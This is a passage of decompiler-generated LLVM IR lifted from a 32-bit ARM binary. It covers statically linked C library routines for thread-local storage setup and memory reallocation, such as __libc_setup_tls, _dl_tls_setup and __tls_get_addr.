  store i32 %v2_1e2f0, i32* %r0.global-to-local, align 4
  %v2_1e2f4 = add i32 %v3_1e2c8, %v1_1e0dc
  store i32 %v2_1e2f4, i32* %r1.global-to-local, align 4
  store i32 %v3_1e2e0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_1e300 = call i32 @mremap(i32 %v2_1e2f0, i32 %v2_1e2f4, i32 %v3_1e2e0, i32 1)
  store i32 %v4_1e300, i32* %r0.global-to-local, align 4
  %v7_1e304 = icmp eq i32 %v4_1e300, -1
  br i1 %v7_1e304, label %dec_label_pc_1e350, label %dec_label_pc_1e30c

dec_label_pc_1e30c:                               ; preds = %dec_label_pc_1e2f0
  %v1_1e30c = load i32, i32* @r4, align 4
  %v2_1e30c = add i32 %v1_1e30c, %v4_1e300
  store i32 %v2_1e30c, i32* %r0.global-to-local, align 4
  %v0_1e310 = load i32, i32* @fp, align 4
  %v1_1e310 = or i32 %v0_1e310, 2
  store i32 %v1_1e310, i32* %r3.global-to-local, align 4
  %v2_1e314 = add i32 %v2_1e30c, 4
  %v3_1e314 = inttoptr i32 %v2_1e314 to i32*
  store i32 %v1_1e310, i32* %v3_1e314, align 4
  %v0_1e318 = load i32, i32* @r8, align 4
  %v1_1e318 = add i32 %v0_1e318, 868
  %v2_1e318 = inttoptr i32 %v1_1e318 to i32*
  %v3_1e318 = load i32, i32* %v2_1e318, align 4
  store i32 %v3_1e318, i32* %r3.global-to-local, align 4
  %v1_1e31c = add i32 %v0_1e318, 880
  %v2_1e31c = inttoptr i32 %v1_1e31c to i32*
  %v3_1e31c = load i32, i32* %v2_1e31c, align 4
  store i32 %v3_1e31c, i32* %r2.global-to-local, align 4
  %v0_1e320 = load i32, i32* @r6, align 4
  %v2_1e320 = sub i32 %v3_1e318, %v0_1e320
  store i32 %v2_1e320, i32* %r3.global-to-local, align 4
  %v1_1e324 = load i32, i32* @r7, align 4
  %v2_1e324 = add i32 %v1_1e324, %v2_1e320
  store i32 %v2_1e324, i32* %r1.global-to-local, align 4
  %v1_1e328 = add i32 %v0_1e318, 872
  %v2_1e328 = inttoptr i32 %v1_1e328 to i32*
  %v3_1e328 = load i32, i32* %v2_1e328, align 4
  store i32 %v3_1e328, i32* %r3.global-to-local, align 4
  %v1_1e330 = add i32 %v0_1e318, 884
  %v2_1e330 = inttoptr i32 %v1_1e330 to i32*
  %v3_1e330 = load i32, i32* %v2_1e330, align 4
  store i32 %v3_1e330, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_1e324, %v3_1e31c
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_1e30c
  store i32 %v2_1e324, i32* %v2_1e31c, align 4
  %v0_1e338.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1e338.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_1e30c, %bb33
  %v1_1e338 = phi i32 [ %v0_1e318, %dec_label_pc_1e30c ], [ %v1_1e338.pre, %bb33 ]
  %v0_1e338 = phi i32 [ %v2_1e324, %dec_label_pc_1e30c ], [ %v0_1e338.pre, %bb33 ]
  %v2_1e338 = add i32 %v1_1e338, 868
  %v3_1e338 = inttoptr i32 %v2_1e338 to i32*
  store i32 %v0_1e338, i32* %v3_1e338, align 4
  %v0_1e33c = load i32, i32* %r1.global-to-local, align 4
  %v1_1e33c = load i32, i32* %r3.global-to-local, align 4
  %v2_1e33c = add i32 %v1_1e33c, %v0_1e33c
  store i32 %v2_1e33c, i32* %r1.global-to-local, align 4
  %v1_1e340 = load i32, i32* %r2.global-to-local, align 4
  %v0_1e344 = load i32, i32* %r0.global-to-local, align 4
  %v1_1e344 = add i32 %v0_1e344, 8
  store i32 %v1_1e344, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_1e33c, %v1_1e340
  br i1 %tmp43, label %bb35, label %dec_label_pc_1e388

bb35:                                             ; preds = %bb34
  %v5_1e348 = load i32, i32* @r8, align 4
  %v6_1e348 = add i32 %v5_1e348, 884
  %v7_1e348 = inttoptr i32 %v6_1e348 to i32*
  store i32 %v2_1e33c, i32* %v7_1e348, align 4
  br label %dec_label_pc_1e388

dec_label_pc_1e350:                               ; preds = %dec_label_pc_1e2f0
  %v0_1e350 = load i32, i32* @sb, align 4
  %v1_1e350 = add i32 %v0_1e350, 4
  store i32 %v1_1e350, i32* %r3.global-to-local, align 4
  %v0_1e354 = load i32, i32* @r6, align 4
  %v3_1e354 = icmp ult i32 %v0_1e354, %v1_1e350
  br i1 %v3_1e354, label %dec_label_pc_1e364, label %dec_label_pc_1e350.dec_label_pc_1e35c_crit_edge

dec_label_pc_1e350.dec_label_pc_1e35c_crit_edge:  ; preds = %dec_label_pc_1e350
  %v0_1e35c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1e35c

dec_label_pc_1e35c:                               ; preds = %dec_label_pc_1e350.dec_label_pc_1e35c_crit_edge, %dec_label_pc_1e2bc
  %v0_1e35c = phi i32 [ %v0_1e35c.pre, %dec_label_pc_1e350.dec_label_pc_1e35c_crit_edge ], [ %v0_1e0c4, %dec_label_pc_1e2bc ]
  store i32 %v0_1e35c, i32* @r4, align 4
  br label %dec_label_pc_1e388

dec_label_pc_1e364:                               ; preds = %dec_label_pc_1e350
  %v1_1e364 = add i32 %v0_1e350, -7
  store i32 %v1_1e364, i32* %r0.global-to-local, align 4
  %v1_1e368 = call i32 @malloc(i32 %v1_1e364)
  store i32 %v1_1e368, i32* @r0, align 4
  store i32 %v1_1e368, i32* @r4, align 4
  %v2_1e36c = icmp eq i32 %v1_1e368, 0
  br i1 %v2_1e36c, label %dec_label_pc_1e388, label %dec_label_pc_1e374

dec_label_pc_1e374:                               ; preds = %dec_label_pc_1e364
  %v0_1e374 = load i32, i32* @r6, align 4
  %v1_1e374 = add i32 %v0_1e374, -8
  store i32 %v1_1e374, i32* @r2, align 4
  %v0_1e378 = load i32, i32* @r5, align 4
  store i32 %v0_1e378, i32* @r1, align 4
  %v0_1e37c = call i32 @memcpy()
  %v0_1e380 = load i32, i32* @r5, align 4
  store i32 %v0_1e380, i32* @r0, align 4
  %v0_1e384 = call i32 @free()
  store i32 %v0_1e384, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e388

dec_label_pc_1e388:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_1e364, %dec_label_pc_1e35c, %dec_label_pc_1e2b4, %.thread6, %dec_label_pc_1e124, %dec_label_pc_1e374
  store i32 %v2_1e070, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  %v4_1e398 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 52) to i32*), align 4
  store i32 %v4_1e398, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1e398)
  br label %dec_label_pc_1e3a4

dec_label_pc_1e3a4:                               ; preds = %dec_label_pc_1e0a4, %dec_label_pc_1e04c, %dec_label_pc_1e034, %dec_label_pc_1e388
  %v0_1e3a4 = load i32, i32* @r4, align 4
  store i32 %v0_1e3a4, i32* %r0.global-to-local, align 4
  store i32 %v3_1e014, i32* @r4, align 4
  store i32 %v6_1e014, i32* @r5, align 4
  store i32 %v9_1e014, i32* @r6, align 4
  store i32 %v12_1e014, i32* @r7, align 4
  store i32 %v15_1e014, i32* @r8, align 4
  store i32 %v18_1e014, i32* @sb, align 4
  store i32 %v21_1e014, i32* @sl, align 4
  store i32 %v24_1e014, i32* @fp, align 4
  store i32 %v27_1e014, i32* @lr, align 4
  ret i32 %v0_1e3a4

; uselistorder directives
  uselistorder i32 %v2_1e33c, { 1, 0, 2 }
  uselistorder i32 %v2_1e324, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1e300, { 1, 0, 2 }
  uselistorder i32 %v3_1e2e0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1e284, { 2, 1, 0 }
  uselistorder i32 %v2_1e254, { 1, 0, 2 }
  uselistorder i32 %v0_1e1e8, { 1, 0 }
  uselistorder i32 %v1_1e1a4, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1e108, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1e100, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_1e0e4, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_1e0dc, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1e0d8, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1e0c8, { 1, 0 }
  uselistorder i32 %v0_1e0c4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1e09c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 880, { 3, 4, 1, 2, 0 }
  uselistorder i32 860, { 0, 2, 1, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), { 3, 2, 17, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 20) to i32*), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 76) to i32*), { 2, 0, 1, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 120) to i32*), { 2, 0, 1, 3 }
  uselistorder i32 120, { 0, 5, 1, 9, 7, 8, 2, 3, 4, 6 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_1e3a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1e388, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_1e2b4, { 1, 0 }
  uselistorder label %dec_label_pc_1e254, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1e1a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1e194, { 1, 0 }
  uselistorder label %dec_label_pc_1e190, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1e3b8(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_1e3b8:
  %v0_1e3b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e3b8, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_1e3b8
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_1e3b8, %bb
  %v10_1e3d0 = phi i32 [ %arg1, %dec_label_pc_1e3b8 ], [ 0, %bb ]
  ret i32 %v10_1e3d0

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  %v3_1e3e0 = load i32, i32* @r4, align 4
  store i32 %v3_1e3e0, i32* %stack_var_-16, align 4
  %v4_1e3e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 84) to i32*), align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_1e3ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 68) to i32*), align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v4_1e3f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 44) to i32*), align 4
  store i32 %v4_1e3f4, i32* %r4.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v1_1e3fc = inttoptr i32 %v4_1e3e4 to i32*
  %v2_1e3fc = load i32, i32* %v1_1e3fc, align 4
  %v4_1e400 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 60) to i32*), align 4
  store i32 %v4_1e400, i32* %lr.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v1_1e408 = add i32 %v2_1e3fc, 15
  %v4_1e40c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 160) to i32*), align 4
  store i32 %v4_1e40c, i32* @ip, align 4
  %v1_1e410 = load i32, i32* @r0, align 4
  %v2_1e410 = add i32 %v1_1e410, %v1_1e408
  %v1_1e414 = inttoptr i32 %v4_1e3ec to i32*
  %v2_1e414 = load i32, i32* %v1_1e414, align 4
  store i32 %v2_1e414, i32* %r3.global-to-local, align 4
  %v1_1e418 = and i32 %v2_1e410, -16
  store i32 %v1_1e418, i32* %v1_1e3fc, align 4
  %v0_1e420 = load i32, i32* @r0, align 4
  %v1_1e420 = load i32, i32* %r4.global-to-local, align 4
  %v2_1e420 = inttoptr i32 %v1_1e420 to i32*
  store i32 %v0_1e420, i32* %v2_1e420, align 4
  %v0_1e424 = load i32, i32* @r1, align 4
  %v1_1e424 = load i32, i32* %lr.global-to-local, align 4
  %v2_1e424 = inttoptr i32 %v1_1e424 to i32*
  store i32 %v0_1e424, i32* %v2_1e424, align 4
  %v0_1e428 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e428 = load i32, i32* @ip, align 4
  %v2_1e428 = inttoptr i32 %v1_1e428 to i32*
  store i32 %v0_1e428, i32* %v2_1e428, align 4
  %v2_1e42c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1e42c, i32* %r4.global-to-local, align 4
  %v1_1e430 = load i32, i32* @r0, align 4
  ret i32 %v1_1e430
}

define i32 @function_1e438(i32 %arg1) local_unnamed_addr {
dec_label_pc_1e438:
  %v0_1e438 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e438, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1e438
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1e438, %bb
  %v7_1e448 = phi i32 [ %arg1, %dec_label_pc_1e438 ], [ 0, %bb ]
  ret i32 %v7_1e448

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r3.global-to-local, align 4
  %v4_1e45c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 96) to i32*), align 4
  store i32 %v4_1e45c, i32* @lr, align 4
  %v4_1e468 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 68) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 28260) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 28260), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_1e488 = inttoptr i32 %v4_1e468 to i32*
  store i32 1, i32* %v2_1e488, align 4
  %v0_1e48c = load i32, i32* %r3.global-to-local, align 4
  %v1_1e48c = load i32, i32* @lr, align 4
  %v2_1e48c = inttoptr i32 %v1_1e48c to i32*
  store i32 %v0_1e48c, i32* %v2_1e48c, align 4
  %v0_1e490 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_1e4a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1e4a8:
  %v0_1e4a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e4a8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1e4a8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1e4a8, %bb
  %v9_1e4b0 = phi i32 [ %arg1, %dec_label_pc_1e4a8 ], [ 0, %bb ]
  ret i32 %v9_1e4b0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1e4bc = call i32 @__aeabi_read_tp()
  %v1_1e4c0 = inttoptr i32 %v0_1e4bc to i32*
  %v2_1e4c0 = load i32, i32* %v1_1e4c0, align 4
  %v1_1e4c4 = add i32 %arg1, 4
  %v2_1e4c4 = inttoptr i32 %v1_1e4c4 to i32*
  %v3_1e4c4 = load i32, i32* %v2_1e4c4, align 4
  %v1_1e4c8 = add i32 %v2_1e4c0, 8
  %v2_1e4c8 = inttoptr i32 %v1_1e4c8 to i32*
  %v3_1e4c8 = load i32, i32* %v2_1e4c8, align 4
  %v2_1e4cc = add i32 %v3_1e4c8, %v3_1e4c4
  ret i32 %v2_1e4cc
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1e4d8 = load i32, i32* @r4, align 4
  store i32 %v3_1e4d8, i32* %stack_var_-36, align 4
  %v6_1e4d8 = load i32, i32* @r5, align 4
  %v15_1e4d8 = load i32, i32* @r8, align 4
  %v18_1e4d8 = load i32, i32* @sb, align 4
  %v21_1e4d8 = load i32, i32* @sl, align 4
  %v24_1e4d8 = load i32, i32* @fp, align 4
  %v27_1e4d8 = load i32, i32* @lr, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %sl.global-to-local, align 4
  %v4_1e4e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 116) to i32*), align 4
  store i32 %v4_1e4e8, i32* %r3.global-to-local, align 4
  %v1_1e4ec = inttoptr i32 %v4_1e4e8 to i32*
  %v2_1e4ec = load i32, i32* %v1_1e4ec, align 4
  store i32 %v2_1e4ec, i32* %r2.global-to-local, align 4
  %v2_1e4f0 = icmp eq i32 %v2_1e4ec, 0
  %v0_1e4f8 = load i32, i32* %r0.global-to-local, align 4
  %v0_1e4fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1e4fc, i32* %ip.global-to-local, align 4
  br i1 %v2_1e4f0, label %dec_label_pc_1e6c4, label %dec_label_pc_1e504

dec_label_pc_1e504:                               ; preds = %entry
  store i32 172, i32* %r3.global-to-local, align 4
  %v4_1e508 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 172) to i32*), align 4
  store i32 %v4_1e508, i32* @lr, align 4
  store i32 %v2_1e4ec, i32* %r1.global-to-local, align 4
  %v1_1e550 = inttoptr i32 %v4_1e508 to i32*
  %v2_1e55061 = load i32, i32* %v1_1e550, align 4
  %v4_1e55462 = mul i32 %v2_1e55061, 32
  %v5_1e55463 = add i32 %v4_1e55462, %v2_1e4ec
  store i32 %v5_1e55463, i32* %r3.global-to-local, align 4
  %v3_1e55865 = icmp ult i32 %v2_1e4ec, %v5_1e55463
  br i1 %v3_1e55865, label %dec_label_pc_1e514, label %dec_label_pc_1e6c4.loopexit

dec_label_pc_1e514:                               ; preds = %dec_label_pc_1e504, %dec_label_pc_1e54c
  %v0_1e52c66 = phi i32 [ %v1_1e54c, %dec_label_pc_1e54c ], [ %v2_1e4ec, %dec_label_pc_1e504 ]
  %v1_1e514 = inttoptr i32 %v0_1e52c66 to i32*
  %v2_1e514 = load i32, i32* %v1_1e514, align 4
  store i32 %v2_1e514, i32* %r3.global-to-local, align 4
  %v7_1e518 = icmp eq i32 %v2_1e514, 7
  br i1 %v7_1e518, label %dec_label_pc_1e520, label %dec_label_pc_1e54c

dec_label_pc_1e520:                               ; preds = %dec_label_pc_1e514
  %v1_1e520 = add i32 %v0_1e52c66, 20
  %v2_1e520 = inttoptr i32 %v1_1e520 to i32*
  %v3_1e520 = load i32, i32* %v2_1e520, align 4
  store i32 %v3_1e520, i32* %r3.global-to-local, align 4
  %v1_1e524 = add i32 %v0_1e52c66, 28
  %v2_1e524 = inttoptr i32 %v1_1e524 to i32*
  %v3_1e524 = load i32, i32* %v2_1e524, align 4
  store i32 %v3_1e524, i32* @r6, align 4
  %v1_1e52c = add i32 %v0_1e52c66, 16
  %v2_1e52c = inttoptr i32 %v1_1e52c to i32*
  %v3_1e52c = load i32, i32* %v2_1e52c, align 4
  store i32 %v3_1e52c, i32* %r3.global-to-local, align 4
  %v1_1e530 = add i32 %v0_1e52c66, 8
  %v2_1e530 = inttoptr i32 %v1_1e530 to i32*
  %v3_1e530 = load i32, i32* %v2_1e530, align 4
  store i32 %v3_1e530, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_1e524, %v0_1e4fc
  %v0_1e4fc.v3_1e524 = select i1 %tmp78, i32 %v0_1e4fc, i32 %v3_1e524
  store i32 %v0_1e4fc.v3_1e524, i32* %fp.global-to-local, align 4
  %v2_1e568 = icmp eq i32 %v3_1e524, 0
  br i1 %v2_1e568, label %dec_label_pc_1e590, label %bb

dec_label_pc_1e54c:                               ; preds = %dec_label_pc_1e514
  %v1_1e54c = add i32 %v0_1e52c66, 32
  store i32 %v1_1e54c, i32* %r1.global-to-local, align 4
  %v2_1e550 = load i32, i32* %v1_1e550, align 4
  %v4_1e554 = mul i32 %v2_1e550, 32
  %v5_1e554 = add i32 %v4_1e554, %v2_1e4ec
  store i32 %v5_1e554, i32* %r3.global-to-local, align 4
  %v3_1e558 = icmp ult i32 %v1_1e54c, %v5_1e554
  br i1 %v3_1e558, label %dec_label_pc_1e514, label %dec_label_pc_1e550.dec_label_pc_1e6c4.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_1e520
  %v2_1e56c = add i32 %v3_1e524, -1
  br label %dec_label_pc_1e594

dec_label_pc_1e590:                               ; preds = %dec_label_pc_1e520, %dec_label_pc_1e6c4
  %v0_1e5a4.pre = phi i32 [ %v0_1e5a4.pre.pre, %dec_label_pc_1e6c4 ], [ ptrtoint (i32* @global_var_32024.1324 to i32), %dec_label_pc_1e520 ]
  %v1_1e594.pre = phi i32 [ %v1_1e594.pre.pre, %dec_label_pc_1e6c4 ], [ %v0_1e4f8, %dec_label_pc_1e520 ]
  %v1_1e5b825 = phi i32 [ %v0_1e6cc, %dec_label_pc_1e6c4 ], [ %v0_1e4fc.v3_1e524, %dec_label_pc_1e520 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_1e6c4 ], [ %v3_1e520, %dec_label_pc_1e520 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_1e6c4 ], [ %v3_1e52c, %dec_label_pc_1e520 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_1e6c4 ], [ %v3_1e530, %dec_label_pc_1e520 ]
  br label %dec_label_pc_1e594

dec_label_pc_1e594:                               ; preds = %bb, %dec_label_pc_1e590
  %storemerge80 = phi i32 [ %v2_1e56c, %bb ], [ 0, %dec_label_pc_1e590 ]
  %v0_1e594 = phi i32 [ %v2_1e56c, %bb ], [ 0, %dec_label_pc_1e590 ]
  %storemerge = phi i32 [ %v3_1e524, %bb ], [ 1, %dec_label_pc_1e590 ]
  %storemerge79 = phi i32 [ %v3_1e524, %bb ], [ 1, %dec_label_pc_1e590 ]
  %v0_1e5a4 = phi i32 [ ptrtoint (i32* @global_var_32024.1324 to i32), %bb ], [ %v0_1e5a4.pre, %dec_label_pc_1e590 ]
  %v1_1e594 = phi i32 [ %v0_1e4f8, %bb ], [ %v1_1e594.pre, %dec_label_pc_1e590 ]
  %v1_1e5b8 = phi i32 [ %v0_1e4fc.v3_1e524, %bb ], [ %v1_1e5b825, %dec_label_pc_1e590 ]
  %stack_var_-52.3 = phi i32 [ %v3_1e520, %bb ], [ %stack_var_-52.0, %dec_label_pc_1e590 ]
  %stack_var_-48.3 = phi i32 [ %v3_1e52c, %bb ], [ %stack_var_-48.0, %dec_label_pc_1e590 ]
  %stack_var_-44.3 = phi i32 [ %v3_1e530, %bb ], [ %stack_var_-44.0, %dec_label_pc_1e590 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_1e594 = add i32 %v1_1e594, %v0_1e594
  %v2_1e598 = udiv i32 %v2_1e594, %storemerge
  store i32 %v2_1e598, i32* %r0.global-to-local, align 4
  %v2_1e59c = mul i32 %v2_1e598, %storemerge
  store i32 %v2_1e59c, i32* %sb.global-to-local, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_1e5a4 = add i32 %v0_1e5a4, 84
  %v3_1e5a4 = inttoptr i32 %v2_1e5a4 to i32*
  %v4_1e5a4 = load i32, i32* %v3_1e5a4, align 4
  store i32 %v4_1e5a4, i32* %r3.global-to-local, align 4
  %v1_1e5a8 = inttoptr i32 %v4_1e5a4 to i32*
  %v2_1e5a8 = load i32, i32* %v1_1e5a8, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_1e5b0 = add i32 %v1_1e5b8, 1168
  %v2_1e5b4 = add i32 %v1_1e5b0, %stack_var_-52.3
  %v2_1e5b8 = add i32 %v2_1e5b4, %v2_1e59c
  %v2_1e5bc = add i32 %v2_1e5b8, %v2_1e5a8
  store i32 %v2_1e5bc, i32* %r0.global-to-local, align 4
  %v1_1e5c0 = call i32 @__GI_sbrk(i32 %v2_1e5bc)
  %v1_1e5c4 = load i32, i32* %fp.global-to-local, align 4
  %v1_1e5cc = sub i32 0, %v1_1e5c4
  store i32 27748, i32* %r4.global-to-local, align 4
  %v2_1e5c4 = add i32 %v1_1e5c0, 1167
  %v1_1e5d4 = add i32 %v2_1e5c4, %v1_1e5c4
  %v2_1e5d8 = and i32 %v1_1e5d4, %v1_1e5cc
  store i32 %v2_1e5d8, i32* @r5, align 4
  %v1_1e5e0 = load i32, i32* %sl.global-to-local, align 4
  %v3_1e5e0 = add i32 %v1_1e5e0, 27748
  %v4_1e5e0 = inttoptr i32 %v3_1e5e0 to i32*
  store i32 62, i32* %v4_1e5e0, align 4
  %v0_1e5e8 = load i32, i32* @r5, align 4
  %v1_1e5e8 = load i32, i32* %sb.global-to-local, align 4
  %v2_1e5e8 = add i32 %v1_1e5e8, %v0_1e5e8
  store i32 %v2_1e5e8, i32* @ip, align 4
  %v0_1e5ec = load i32, i32* %sl.global-to-local, align 4
  %v1_1e5ec = load i32, i32* %r4.global-to-local, align 4
  %v2_1e5ec = add i32 %v1_1e5ec, %v0_1e5ec
  store i32 %v2_1e5ec, i32* %r4.global-to-local, align 4
  %v2_1e5f0 = add i32 %v0_1e5ec, 29036
  store i32 %v2_1e5f0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_1e5e8, i32* @r0, align 4
  %v2_1e604 = add i32 %v2_1e5ec, 16
  %v3_1e604 = inttoptr i32 %v2_1e604 to i32*
  store i32 %v2_1e5e8, i32* %v3_1e604, align 4
  %v0_1e608 = load i32, i32* %sb.global-to-local, align 4
  %v1_1e608 = load i32, i32* %r8.global-to-local, align 4
  %v2_1e608 = add i32 %v1_1e608, 40
  %v3_1e608 = inttoptr i32 %v2_1e608 to i32*
  store i32 %v0_1e608, i32* %v3_1e608, align 4
  %v0_1e60c = load i32, i32* @r3, align 4
  %v1_1e60c = trunc i32 %v0_1e60c to i8
  %v2_1e60c = load i32, i32* %r4.global-to-local, align 4
  %v3_1e60c = add i32 %v2_1e60c, 20
  %v4_1e60c = inttoptr i32 %v3_1e60c to i8*
  store i8 %v1_1e60c, i8* %v4_1e60c, align 1
  %v0_1e610 = load i32, i32* %r4.global-to-local, align 4
  %v1_1e610 = add i32 %v0_1e610, 8
  store i32 %v1_1e610, i32* @r4, align 4
  %v0_1e614 = call i32 @memcpy()
  %v0_1e61c = load i32, i32* @r4, align 4
  %v1_1e61c = load i32, i32* @r5, align 4
  %v2_1e61c = inttoptr i32 %v1_1e61c to i32*
  store i32 %v0_1e61c, i32* %v2_1e61c, align 4
  %v0_1e620 = load i32, i32* @r5, align 4
  store i32 %v0_1e620, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_1e620, -4096
